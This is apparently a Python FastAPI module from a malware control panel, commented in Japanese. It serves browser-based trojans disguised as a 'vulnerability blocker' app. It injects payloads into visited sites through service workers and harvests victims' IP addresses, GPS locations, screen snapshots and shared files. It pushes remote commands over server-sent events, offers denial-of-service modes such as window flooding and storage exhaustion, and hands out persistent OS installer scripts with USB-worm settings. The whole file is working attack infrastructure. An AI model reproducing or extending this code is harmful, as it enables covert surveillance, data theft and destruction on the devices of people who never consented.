"""
app/virus.py — ウイルス兵器モジュール

モード:
  trojan_link    トロイの木馬（リンク型）
  trojan_install トロイの木馬（常駐型）
  max_power      全部盛り（最高威力）
  brick          ブリック（タブが死なない）
  windows        爆音窓爆弾（音＋大量ウィンドウ）※単体の無限窓モードはそのまま
  storage        容量枯渇
  mix            全部ミックス
  singularity    特異点（全46系統統合・PWA常駐・SW注入・SSE C2・RAT・USB・
                 OS常駐インストーラ・無限窓繁殖）
"""
from __future__ import annotations

import asyncio
import base64
import datetime as dt
import json
import os
import re
import secrets
import sqlite3
from typing import Any, Dict, List, Optional
from urllib.parse import quote_plus

from fastapi import APIRouter, Depends, Form, HTTPException, Request
from fastapi.responses import (HTMLResponse, JSONResponse, PlainTextResponse,
                               RedirectResponse, Response, StreamingResponse)

from . import tenancy, users

router = APIRouter()

_GIF1 = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")

MODE_LABEL: Dict[str, str] = {}
MODE_DESC: Dict[str, str] = {}
CAUTION: Dict[str, str] = {}

try:
    from .singularity import (PAYLOAD_JS as _SG_PAYLOAD, SW_JS as _SG_SW,
                              WORKER_JS as _SG_WORKER, SHARED_JS as _SG_SHARED,
                              INSTALL_BAT as _SG_BAT, INSTALL_COMMAND as _SG_CMD,
                              INSTALL_SH as _SG_SH, build_installer as _sg_installer,
                              VIRUS as SINGULARITY,
                              new_sid as _sg_sid, LEVEL_LABEL as _SG_LEVEL_LABEL,
                              LEVEL_DESC as _SG_LEVEL_DESC,
                              APP_NAME_DEFAULT as _SG_APP_NAME)
    _SG = True
except Exception:
    _SG = False
    _SG_PAYLOAD = _SG_SW = _SG_WORKER = _SG_SHARED = ""
    _SG_BAT = _SG_CMD = _SG_SH = ""
    SINGULARITY = {}
    _SG_LEVEL_LABEL = {}
    _SG_LEVEL_DESC = {}
    _SG_APP_NAME = "脆弱性ブロッカー"
    def _sg_sid(n: int = 14) -> str:
        return secrets.token_urlsafe(16).replace("-", "").replace("_", "")[:n]
    def _sg_installer(tmpl, url, code, app, burn, disk_mb, ver=""):
        return tmpl

_SG_VER = os.getenv("SG_APP_VER", "3.4")
_SG_INJ = os.getenv("SG_INJ", "1") != "0"
_SG_SSE = os.getenv("SG_SSE", "1") != "0"
_SG_RAT = os.getenv("SG_RAT", "1") != "0"
_SG_INSTALL_LEVEL = int(os.getenv("SG_INSTALL_LEVEL", "4") or 4)

if _SG:
    MODE_LABEL["singularity"] = "特異点（SINGULARITY）"
    MODE_DESC["singularity"] = ("全46系統統合の最上位。PWAとして常駐し、SWがサイト全体に"
                                "自分を注入し、SSEで即時遠隔操作。"
                                "L7では窓が指数増殖し、各窓がヘビースキンで高火力化する。")
    CAUTION["singularity"] = ("ブラウザの権限内で物理限界まで攻める。"
                              "L7は窓がリミッターなしで倍々に増え続ける。")

MODE_LABEL.setdefault("trojan_link", "トロイの木馬（リンク型）")
MODE_LABEL.setdefault("trojan_install", "トロイの木馬（常駐型）")
MODE_LABEL.setdefault("max_power", "全部盛り（最高威力）")
MODE_LABEL.setdefault("brick", "ブリック")
MODE_LABEL.setdefault("windows", "爆音窓爆弾")
MODE_LABEL.setdefault("storage", "容量枯渇")
MODE_LABEL.setdefault("mix", "全部ミックス")

SCHEMA = """
CREATE TABLE IF NOT EXISTS virus_links(
  code TEXT PRIMARY KEY, owner TEXT, mode TEXT, name TEXT, dest TEXT,
  active INTEGER DEFAULT 1, created TEXT, last_ts TEXT,
  winset INTEGER DEFAULT 100, firing INTEGER DEFAULT 1, seq INTEGER DEFAULT 0,
  notify INTEGER DEFAULT 1, notify_text TEXT, notify_mode TEXT,
  level INTEGER DEFAULT 1, fixed INTEGER DEFAULT 0, wipe_seq INTEGER DEFAULT 0,
  inj INTEGER DEFAULT 1, freeze TEXT, bomb TEXT, hits INTEGER DEFAULT 0, uniq INTEGER DEFAULT 0
);
CREATE INDEX IF NOT EXISTS virus_links_owner ON virus_links(owner, created);
CREATE TABLE IF NOT EXISTS virus_hits(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, ts TEXT, ip TEXT, ua TEXT,
  device TEXT, os TEXT, browser TEXT, ref TEXT, vid TEXT, is_bot INTEGER DEFAULT 0,
  gps_lat REAL, gps_lon REAL
);
CREATE INDEX IF NOT EXISTS virus_hits_code ON virus_hits(code, id);
CREATE TABLE IF NOT EXISTS virus_data(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, hit INTEGER, vid TEXT,
  key TEXT, value TEXT, ts TEXT);
CREATE INDEX IF NOT EXISTS virus_data_code ON virus_data(code, hit);
CREATE TABLE IF NOT EXISTS virus_cmd(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, sid TEXT, kind TEXT,
  arg TEXT, state INTEGER DEFAULT 0, ts TEXT);
CREATE INDEX IF NOT EXISTS virus_cmd_code ON virus_cmd(code, state);
"""


# ---------------- 基盤 ----------------

def _m():
    from . import main
    return main


def _render(name, request, **ctx):
    return _m().render(name, request, **ctx)


async def _auth(request: Request):
    return await _m().auth(request)


def _now():
    return dt.datetime.now(dt.timezone.utc).isoformat(timespec="seconds")


def _base(request):
    return _m()._base(request).rstrip("/")


def _abs_dest(d):
    d = (d or "").strip()
    if not d:
        return ""
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*:", d):
        d = "https://" + d
    return d


def _owner(code):
    try:
        o = users.owner_of_link(code)
    except Exception:
        o = None
    if not o:
        return None
    try:
        tenancy.set_current(o)
    except Exception:
        pass
    return o


def _dir(owner):
    d = os.path.join(tenancy.ROOT, tenancy.safe_name(owner), "virus")
    os.makedirs(d, exist_ok=True)
    return d


def _migrate(c):
    try:
        cols = {r["name"] for r in c.execute("PRAGMA table_info(virus_links)").fetchall()}
    except Exception:
        cols = set()
    for name, ddl in (("winset", "INTEGER DEFAULT 100"),
                      ("firing", "INTEGER DEFAULT 1"),
                      ("seq", "INTEGER DEFAULT 0"),
                      ("notify", "INTEGER DEFAULT 1"),
                      ("notify_text", "TEXT"),
                      ("notify_mode", "TEXT"),
                      ("level", "INTEGER DEFAULT 1"),
                      ("fixed", "INTEGER DEFAULT 0"),
                      ("wipe_seq", "INTEGER DEFAULT 0"),
                      ("inj", "INTEGER DEFAULT 1"),
                      ("freeze", "TEXT"),
                      ("bomb", "TEXT"),
                      ("hits", "INTEGER DEFAULT 0"),
                      ("uniq", "INTEGER DEFAULT 0")):
        if name not in cols:
            try:
                c.execute(f"ALTER TABLE virus_links ADD COLUMN {name} {ddl}")
            except Exception:
                pass
    c.commit()


def _db(owner: str) -> sqlite3.Connection:
    d = _dir(owner)
    c = sqlite3.connect(os.path.join(d, "virus.db"), timeout=10)
    c.row_factory = sqlite3.Row
    try:
        c.execute("PRAGMA journal_mode=WAL")
    except Exception:
        pass
    c.executescript(SCHEMA)
    _migrate(c)
    return c


def _link(c: sqlite3.Connection, code: str):
    return c.execute("SELECT * FROM virus_links WHERE code=?", (code,)).fetchone()


def _val(row, key, default=None):
    try:
        v = row[key]
        return default if v is None else v
    except Exception:
        return default


def _lv(v) -> int:
    """レベルは 0〜7 の8段階。7は固定枠。"""
    try:
        return max(0, min(7, int(v)))
    except Exception:
        return 1


def _is_fixed(row) -> bool:
    try:
        return bool(int(_val(row, "fixed", 0) or 0))
    except Exception:
        return False


def _record_hit(owner, code, request) -> int:
    ua = request.headers.get("user-agent", "")[:300]
    ip = (request.headers.get("x-forwarded-for", "").split(",")[0].strip()
          or (request.client.host if request.client else ""))[:64]
    ref = request.query_params.get("ref", "")[:120]
    dev, os_, br = _ua(ua)
    c = _db(owner)
    cur = c.execute(
        "INSERT INTO virus_hits(code,ts,ip,ua,device,os,browser,ref,is_bot) "
        "VALUES(?,?,?,?,?,?,?,?,?)",
        (code, _now(), ip, ua, dev, os_, br, ref, 1 if _bot(ua) else 0))
    hid = cur.lastrowid
    c.execute("UPDATE virus_links SET last_ts=?, hits=COALESCE(hits,0)+1 WHERE code=?",
              (_now(), code))
    c.commit()
    c.close()
    return hid


def _ua(ua: str):
    u = (ua or "").lower()
    if "android" in u:
        dev = "Android"
    elif "iphone" in u or "ipad" in u:
        dev = "iOS"
    elif "windows" in u:
        dev = "Windows"
    elif "mac os" in u:
        dev = "macOS"
    elif "linux" in u:
        dev = "Linux"
    else:
        dev = "不明"
    if "edg/" in u:
        br = "Edge"
    elif "chrome/" in u and "chromium" not in u:
        br = "Chrome"
    elif "firefox/" in u:
        br = "Firefox"
    elif "safari/" in u and "chrome" not in u:
        br = "Safari"
    else:
        br = "不明"
    return dev, dev, br


def _bot(ua: str) -> bool:
    return bool(re.search(r"bot|crawl|spider|headless|curl|wget|python", (ua or "").lower()))


# ---------------- singularity 連携 ----------------

def _sg_flat(prefix, obj, out, depth=0):
    """singularity の巨大JSONを key/value に平坦化する。"""
    if depth > 7 or len(out) > 400:
        return
    if isinstance(obj, dict):
        for k, v in obj.items():
            _sg_flat(f"{prefix}.{k}" if prefix else str(k), v, out, depth + 1)
    elif isinstance(obj, list):
        if obj and not any(isinstance(x, (dict, list)) for x in obj):
            out[prefix] = json.dumps(obj, ensure_ascii=False)
        else:
            for i, v in enumerate(obj[:40]):
                _sg_flat(f"{prefix}[{i}]", v, out, depth + 1)
    elif obj is None:
        return
    else:
        out[prefix] = obj


def _sg_ingest(owner, code, report, sid):
    """singularity の報告を virus_data に取り込む（差分のみ・監視室にそのまま出る）。"""
    sid = str(sid or report.get("sid") or "")[:64]
    c = _db(owner)
    hid = 0
    if sid:
        r = c.execute("SELECT id FROM virus_hits WHERE code=? AND vid=? "
                      "ORDER BY id DESC LIMIT 1", (code, sid)).fetchone()
        hid = r["id"] if r else 0
    if not hid:
        r = c.execute("SELECT id FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 1",
                      (code,)).fetchone()
        hid = r["id"] if r else 0

    items = {}
    _sg_flat("", report, items)
    snap = (report.get("media") or {}).get("snapshot") or ""
    items.pop("media.snapshot", None)

    have = {}
    for r in c.execute("SELECT key,value FROM virus_data WHERE code=? AND hit=?",
                       (code, hid)).fetchall():
        have[r["key"]] = r["value"]

    ts = _now()
    n = 0
    for k, v in list(items.items())[:400]:
        sv = json.dumps(v, ensure_ascii=False) if isinstance(v, (dict, list)) else str(v)
        sv = sv[:4000]
        if have.get(k) == sv:
            continue
        c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
                  (code, hid, sid, k, sv, ts))
        n += 1
    if snap:
        c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
                  (code, hid, sid, "media.snapshot", snap[:200000], ts))
        n += 1

    # 端末情報の更新
    try:
        env = report.get("env") or {}
        if env.get("ua"):
            nu = str(env["ua"])[:300]
            nd, no, nb = _ua(nu)
            c.execute("UPDATE virus_hits SET ua=?,device=?,os=?,browser=? WHERE id=?",
                      (nu, nd, no, nb, hid))
        c.execute("UPDATE virus_hits SET is_bot=0 WHERE id=?", (hid,))
    except Exception:
        pass

    gps = (report.get("network") or {}).get("gps") or {}
    try:
        if gps.get("lat") is not None:
            c.execute("UPDATE virus_hits SET gps_lat=?, gps_lon=? WHERE id=?",
                      (float(gps["lat"]), float(gps["lon"]), hid))
    except Exception:
        pass

    c.execute("UPDATE virus_links SET last_ts=? WHERE code=?", (ts, code))
    try:
        c.execute("DELETE FROM virus_data WHERE code=? AND id NOT IN "
                  "(SELECT id FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 20000)",
                  (code, code))
    except Exception:
        pass
    c.commit()
    c.close()
    return n


def _sg_cfg(row, code, sid, lv, app_name, extra=None):
    """singularity の CFG を組み立てる（本体ページと注入用 p.js で共有）。"""
    base = f"/v/{code}/sg"
    fixed = _is_fixed(row)
    if fixed:
        lv = 7
    cfg = {
        "sid": sid, "path": base, "collect": base + "/c", "cmd": base + "/cmd",
        "sse": base + "/sse" if _SG_SSE else "", "ack": base + "/ack",
        "sw": base + "/sw.js", "pjs": base + "/p.js", "manifest": base + "/manifest.json",
        "icons": [base + "/icon-192.png", base + "/icon-512.png"],
        "level": lv, "fire": int(_val(row, "firing", 1) or 0),
        "freeze": _val(row, "freeze", "") or "", "bomb": _val(row, "bomb", "") or "",
        "w": 0, "wipe": False, "avName": app_name, "ver": _SG_VER,
        "install": os.getenv("SG_INSTALL", "auto"), "installLevel": _SG_INSTALL_LEVEL,
        "inj": bool(_SG_INJ and int(_val(row, "inj", 1) or 0)),
        "rat": bool(_SG_RAT), "sseOn": bool(_SG_SSE),
        "fixed": fixed,
        "finalRamMB": int(os.getenv("SG_FINAL_RAM_MB", "0") or 0),
        "gpuMem": os.getenv("SG_GPU_MEM", "1") != "0",
        "winLock": _sg_win_lock(),
        "code": code, "usbCode": code, "usbWorm": True, "usbBase": "", "usbLabel": app_name,
    }
    if extra:
        cfg.update(extra)
    return cfg


def _sg_win_lock():
    out = {}
    m = os.getenv("SG_WIN_MODE", "")
    if m:
        out["mode"] = m
    b = os.getenv("SG_WIN_BRANCH", "")
    if b.isdigit():
        out["branch"] = max(1, min(8, int(b)))
    d = os.getenv("SG_WIN_DEPTH", "")
    if d.isdigit():
        out["depth"] = max(0, int(d))
    return out


def _sg_land(code, request, sid=""):
    owner = _owner(code)
    if not owner:
        return PlainTextResponse("リンクが無効です", status_code=404)
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row or not row["active"]:
        return PlainTextResponse("リンクが無効です", status_code=404)

    sid = (sid or _sg_sid())[:64]
    ref = request.query_params.get("ref") or ""
    w = request.query_params.get("w") or "0"
    wipe = request.query_params.get("wipe") == "1"
    installed = request.query_params.get("i") == "1"
    hid = _record_hit(owner, code, request)
    c = _db(owner)
    try:
        c.execute("UPDATE virus_hits SET vid=? WHERE id=?", (sid, hid))
        c.commit()
    except Exception:
        pass
    c.close()

    lv = int(_val(row, "level", 1) or 0)
    if _is_fixed(row):
        lv = 7
    lvq = request.query_params.get("level")
    if lvq is not None and str(lvq).isdigit() and not _is_fixed(row):
        lv = _lv(lvq)
    if installed:
        lv = max(lv, _SG_INSTALL_LEVEL)

    app_name = (row["name"] or "").strip() or _SG_APP_NAME
    cfg = _sg_cfg(row, code, sid, lv, app_name,
                  {"w": int(w) if str(w).isdigit() else 0, "wipe": wipe})
    resp = _render("virus_singularity.html", request,
                   code=code, sid=sid, row=dict(row), ref=ref, level=lv,
                   level_label=_SG_LEVEL_LABEL.get(lv, ""),
                   manifest=cfg["manifest"] + "?n=" + quote_plus(app_name),
                   icon192=cfg["icons"][0], icon512=cfg["icons"][1], app_name=app_name,
                   cfg_json=json.dumps(cfg, ensure_ascii=False),
                   worker_json=json.dumps(_SG_WORKER),
                   shared_json=json.dumps(_SG_SHARED),
                   payload=_SG_PAYLOAD)
    resp.headers["Cross-Origin-Opener-Policy"] = "same-origin"
    resp.headers["Cross-Origin-Embedder-Policy"] = "require-corp"
    try:
        resp.set_cookie("sgid", sid, max_age=315360000, samesite="lax", path="/")
    except Exception:
        pass
    return resp


# ---------------- singularity ルート ----------------

@router.get("/v/{code}/sg/p.js")
def sg_pjs(code: str, sid: str = "", level: str = "", u: str = "", v: str = ""):
    """SWが全ページに差し込む注入用ペイロード。"""
    owner = _owner(code)
    if not owner:
        raise HTTPException(404)
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row or not row["active"]:
        raise HTTPException(404)
    sid = (sid or _sg_sid())[:64]
    lv = int(_val(row, "level", 1) or 0)
    if level.isdigit():
        lv = _lv(level)
    cfg = _sg_cfg(row, code, sid, lv, (row["name"] or "").strip() or _SG_APP_NAME,
                  {"injected": True, "install": "click", "windows": 0, "hop": False})
    js = ("window.__SINGULARITY_CFG__=" + json.dumps(cfg, ensure_ascii=False)
          + ";window.__SINGULARITY_WORKER__=" + json.dumps(_SG_WORKER) + ";"
          + "window.__SINGULARITY_SHARED__=" + json.dumps(_SG_SHARED) + ";"
          + "window.__SINGULARITY_VER__=" + json.dumps(_SG_VER) + ";"
          + _SG_PAYLOAD)
    return Response(js, media_type="application/javascript",
                    headers={"Cache-Control": "public, max-age=300",
                            "Access-Control-Allow-Origin": "*"})


@router.get("/v/{code}/sg/sw.js")
def sg_sw(code: str):
    return Response(_SG_SW, media_type="application/javascript",
                    headers={"Service-Worker-Allowed": "/", "Cache-Control": "no-store",
                            "Cross-Origin-Opener-Policy": "same-origin",
                            "Cross-Origin-Embedder-Policy": "require-corp"})


@router.get("/v/{code}/sg/manifest.json")
def sg_manifest(code: str, name: str = ""):
    base = f"/v/{code}/sg"
    app = (name or os.getenv("SG_APP_NAME") or _SG_APP_NAME)[:40]
    icons = [{"src": base + "/icon.svg", "sizes": "any",
              "type": "image/svg+xml", "purpose": "any maskable"}]
    man = {
        "name": app, "short_name": app[:12],
        "start_url": base + "?i=1", "scope": "/",
        "display": "standalone", "display_override": ["window-controls-overlay", "standalone"],
        "background_color": "#05070a", "theme_color": "#05070a",
        "icons": icons,
        "share_target": {"action": base + "/share", "method": "POST",
                         "enctype": "multipart/form-data",
                         "params": {"title": "t", "text": "d", "url": "u"}},
        "protocol_handlers": [{"protocol": "web+sg", "url": base + "/?ref=%s"}],
        "file_handlers": [{"action": base,
                           "accept": {"application/x-singularity": [".sg"]}}],
        "edge_side_panel": {"preferred_width": 420},
        "note_taking": {"new_note_url": base + "?ref=note"},
        "prefer_related_applications": False,
    }
    return JSONResponse(man, headers={
        "Content-Type": "application/manifest+json; charset=utf-8",
        "Cache-Control": "no-store",
    })


_SG_ICON_SVG = (
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">'
    '<rect width="512" height="512" fill="#05070a"/>'
    '<circle cx="256" cy="256" r="170" fill="none" stroke="#00ff88" stroke-width="14"/>'
    '<circle cx="256" cy="256" r="104" fill="none" stroke="#4c8dff" stroke-width="12"/>'
    '<circle cx="256" cy="256" r="46" fill="#00ff88"/>'
    '<circle cx="256" cy="256" r="12" fill="#ebfff6"/></svg>'
)


@router.get("/v/{code}/sg/icon.svg")
def sg_icon_svg():
    return Response(_SG_ICON_SVG, media_type="image/svg+xml",
                    headers={"Cache-Control": "public, max-age=86400"})


@router.get("/v/{code}/sg/icon-192.png")
def sg_icon192():
    return Response(_SG_ICON_SVG, media_type="image/svg+xml")


@router.get("/v/{code}/sg/icon-512.png")
def sg_icon512():
    return Response(_SG_ICON_SVG, media_type="image/svg+xml")


@router.get("/v/{code}/sg/c")
async def sg_collect_get(code: str, request: Request, sid: str = "", d: str = ""):
    """画像ピクセル経路（GET）。+ が空白に潰れるので戻す。"""
    owner = _owner(code)
    if not owner:
        return Response(_GIF1, media_type="image/gif")
    if d:
        try:
            d = d.replace(" ", "+")
            body = json.loads(base64.b64decode(d + "=" * (-len(d) % 4)).decode("utf-8"))
        except Exception:
            body = {}
        if isinstance(body, dict) and body:
            try:
                _sg_ingest(owner, code, body, sid or str(body.get("sid") or ""))
            except Exception:
                pass
    return Response(_GIF1, media_type="image/gif")


@router.post("/v/{code}/sg/c")
async def sg_collect(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    try:
        body = await request.json()
    except Exception:
        body = {}
    if isinstance(body, dict) and body:
        try:
            _sg_ingest(owner, code, body, str(body.get("sid") or ""))
        except Exception:
            pass
    return {"ok": 1}


def _sg_cmd_payload(owner, code, sid):
    c = _db(owner)
    row = _link(c, code)
    if not row or not row["active"]:
        c.close()
        return {"ok": 0}
    cmds = [dict(r) for r in c.execute(
        "SELECT id,kind,arg FROM virus_cmd WHERE code=? AND state<2 AND (sid=? OR sid='') "
        "ORDER BY id LIMIT 40", (code, sid or "")).fetchall()]
    if cmds:
        c.execute("UPDATE virus_cmd SET state=1 WHERE code=? AND state=0 AND (sid=? OR sid='')",
                  (code, sid or ""))
        c.commit()
    fixed = _is_fixed(row)
    out = {"ok": 1,
           "level": 7 if fixed else int(_val(row, "level", 1) or 0),
           "fixed": fixed,
           "fire": int(_val(row, "firing", 1) or 0),
           "freeze": _val(row, "freeze", "") or "",
           "wipe": int(_val(row, "wipe_seq", 0) or 0),
           "ver": _SG_VER, "cmds": cmds, "server": _now()}
    c.close()
    return out


@router.get("/v/{code}/sg/cmd")
def sg_cmd(code: str, sid: str = ""):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    return _sg_cmd_payload(owner, code, sid)


@router.get("/v/{code}/sg/sse")
async def sg_sse(code: str, request: Request, sid: str = ""):
    owner = _owner(code)
    if not owner:
        raise HTTPException(404)

    async def gen():
        last, n = "", 0
        while True:
            try:
                if await request.is_disconnected():
                    break
                p = _sg_cmd_payload(owner, code, sid)
                body = json.dumps(p, ensure_ascii=False)
                if body != last:
                    last = body
                    yield "data: " + body + "\n\n"
                n += 1
                if n % 8 == 0:
                    yield ": ping\n\n"
            except Exception:
                yield ": err\n\n"
            await asyncio.sleep(2)

    return StreamingResponse(gen(), media_type="text/event-stream", headers={
        "Cache-Control": "no-cache", "X-Accel-Buffering": "no", "Connection": "keep-alive",
        "Access-Control-Allow-Origin": "*"})


@router.post("/v/{code}/sg/ack")
async def sg_ack(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    try:
        body = await request.json()
    except Exception:
        body = {}
    ids = body.get("ids") or []
    if not isinstance(ids, list):
        ids = []
    c = _db(owner)
    n = 0
    for i in ids[:100]:
        try:
            c.execute("UPDATE virus_cmd SET state=2 WHERE id=? AND code=?", (int(i), code))
            n += 1
        except Exception:
            pass
    c.commit()
    c.close()
    return {"ok": 1, "n": n}


@router.get("/v/{code}/sg/worker.js")
def sg_worker(code: str):
    return Response(_SG_WORKER, media_type="application/javascript",
                    headers={"Cache-Control": "no-store"})


@router.get("/v/{code}/sg/shared.js")
def sg_shared(code: str):
    return Response(_SG_SHARED, media_type="application/javascript",
                    headers={"Cache-Control": "no-store",
                            "Cross-Origin-Opener-Policy": "same-origin",
                            "Cross-Origin-Embedder-Policy": "require-corp"})


# --- OS常駐インストーラ配布（拡張子で形式が決まる） ---

def _installer_common(code, request):
    owner = _owner(code)
    if not owner:
        raise HTTPException(404)
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row or not row["active"]:
        raise HTTPException(404)
    return row


@router.get("/v/{code}/sg/install.bat")
def sg_install_bat(code: str, request: Request, burn: str = "", disk: str = "",
                   app: str = "", t: str = ""):
    row = _installer_common(code, request)
    base = _base(request)
    url = f"{base}/v/{code}/sg?u=os&i=1"
    burn_i = int(burn) if burn.isdigit() else (os.cpu_count() or 4)
    disk_i = int(disk) if disk.isdigit() else 1024
    name = (app or (row["name"] or "") or _SG_APP_NAME)
    body = _sg_installer(_SG_BAT, url, code, name, burn_i, disk_i, _SG_VER)
    fn = re.sub(r"[^A-Za-z0-9_.\-]", "_", name)[:40] or "blocker"
    return Response(body, media_type="application/octet-stream",
                    headers={"Content-Disposition": f'attachment; filename="{fn}.bat"',
                             "Cache-Control": "no-store"})


@router.get("/v/{code}/sg/install.command")
def sg_install_command(code: str, request: Request, burn: str = "", disk: str = "",
                       app: str = "", t: str = ""):
    row = _installer_common(code, request)
    base = _base(request)
    url = f"{base}/v/{code}/sg?u=os&i=1"
    burn_i = int(burn) if burn.isdigit() else (os.cpu_count() or 4)
    disk_i = int(disk) if disk.isdigit() else 1024
    name = (app or (row["name"] or "") or _SG_APP_NAME)
    body = _sg_installer(_SG_CMD, url, code, name, burn_i, disk_i, _SG_VER)
    fn = re.sub(r"[^A-Za-z0-9_.\-]", "_", name)[:40] or "blocker"
    return Response(body, media_type="application/octet-stream",
                    headers={"Content-Disposition": f'attachment; filename="{fn}.command"',
                             "Cache-Control": "no-store"})


@router.get("/v/{code}/sg/install.sh")
def sg_install_sh(code: str, request: Request, burn: str = "", disk: str = "",
                  app: str = "", t: str = ""):
    row = _installer_common(code, request)
    base = _base(request)
    url = f"{base}/v/{code}/sg?u=os&i=1"
    burn_i = int(burn) if burn.isdigit() else (os.cpu_count() or 4)
    disk_i = int(disk) if disk.isdigit() else 1024
    name = (app or (row["name"] or "") or _SG_APP_NAME)
    body = _sg_installer(_SG_SH, url, code, name, burn_i, disk_i, _SG_VER)
    fn = re.sub(r"[^A-Za-z0-9_.\-]", "_", name)[:40] or "blocker"
    return Response(body, media_type="application/octet-stream",
                    headers={"Content-Disposition": f'attachment; filename="{fn}.sh"',
                             "Cache-Control": "no-store"})


@router.post("/v/{code}/sg/share")
async def sg_share(code: str, request: Request, sid: str = ""):
    """share_target の受け口。共有されたファイル名を報告に載せる。"""
    owner = _owner(code)
    if not owner:
        return PlainTextResponse("ok")
    try:
        form = await request.form()
        got = []
        for k, v in form.multi_items():
            try:
                if hasattr(v, "filename"):
                    got.append({"k": str(k)[:40], "v": "file:" + str(v.filename)[:120]})
                else:
                    got.append({"k": str(k)[:40], "v": str(v)[:200]})
            except Exception:
                pass
        _sg_ingest(owner, code, {"sid": sid or "share", "share": {"items": got[:40]}},
                   sid or "share")
    except Exception:
        pass
    return RedirectResponse(f"/v/{code}/sg?u=share", status_code=303)


@router.get("/v/{code}/sg/{sid}")
def sg_child(code: str, sid: str, request: Request):
    return _sg_land(code, request, sid=sid)


@router.get("/v/{code}/sg")
def sg_root(code: str, request: Request):
    return _sg_land(code, request)


# --- 監視室からの制御（フォーム版） ---

@router.post("/vp/{code}/level")
def sg_level(code: str, level: str = Form("1"), u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    row = _link(c, code)
    fixed = _is_fixed(row) if row else False
    lv = 7 if fixed else _lv(level)
    c.execute("UPDATE virus_links SET level=?, firing=1 WHERE code=?", (lv, code))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code + "?lvl=" + str(lv), status_code=303)


@router.post("/vp/{code}/fix")
def sg_fix(code: str, fixed: str = Form("1"), u=Depends(_auth)):
    """固定枠の設定／解除。立てると L7 にロックされ、遠隔から下げられない。"""
    owner = tenancy.get_current() or u
    c = _db(owner)
    v = 0 if str(fixed) in ("0", "false", "off", "") else 1
    c.execute("UPDATE virus_links SET fixed=?, level=? WHERE code=?",
              (v, 7 if v else _val(_link(c, code), "level", 1), code))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code + "?fix=" + str(v), status_code=303)


@router.post("/vp/{code}/win")
def sg_win(code: str, n: str = Form("2"), u=Depends(_auth)):
    """監視室から窓繁殖を強制発火（個体に win コマンドを配る）。"""
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("INSERT INTO virus_cmd(code,sid,kind,arg,state,ts) VALUES(?,?,?,?,0,?)",
              (code, "", "win", str(n), _now()))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code + "?win=" + str(n), status_code=303)


@router.post("/vp/{code}/cmd")
def sg_cmd_add(code: str, kind: str = Form(""), arg: str = Form(""),
               sid: str = Form(""), u=Depends(_auth)):
    owner = tenancy.get_current() or u
    if not kind:
        return RedirectResponse("/vp/" + code, status_code=303)
    c = _db(owner)
    c.execute("INSERT INTO virus_cmd(code,sid,kind,arg,state,ts) VALUES(?,?,?,?,0,?)",
              (code, sid, kind, arg, _now()))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code + "?cmd=" + kind, status_code=303)


@router.post("/vp/{code}/wipe")
def sg_wipe(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET wipe_seq=COALESCE(wipe_seq,0)+1 WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.get("/vp/{code}/data")
def sg_data(code: str, u=Depends(_auth)):
    """監視室のライブデータ（JSON）。"""
    owner = tenancy.get_current() or u
    c = _db(owner)
    rows = [dict(r) for r in c.execute(
        "SELECT key,value,ts,vid FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 600",
        (code,)).fetchall()]
    hits = [dict(r) for r in c.execute(
        "SELECT id,ts,ip,device,os,browser,vid,gps_lat,gps_lon FROM virus_hits "
        "WHERE code=? ORDER BY id DESC LIMIT 40", (code,)).fetchall()]
    c.close()
    return {"ok": 1, "data": rows, "hits": hits, "server": _now()}